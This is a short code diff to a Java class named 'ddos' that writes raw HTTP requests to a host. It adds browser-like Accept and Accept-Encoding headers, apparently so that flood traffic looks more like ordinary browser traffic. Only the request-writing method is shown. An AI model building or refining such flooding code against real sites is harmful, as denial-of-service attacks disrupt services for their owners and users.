@@ -42,6 +42,8 @@ public class ddos implements Runnable {
 	public static void send(PrintWriter out, String host) throws IOException {
 		out.println(header);
 		out.println((new StringBuilder("Host: ")).append(host).toString());
+		out.println("Accept: image/webp,image/apng,image/*,*/*;q=0.8");
+		out.println("Accept-Encoding: gzip, deflate, br");
 		out.println();
 		out.flush();
 	}
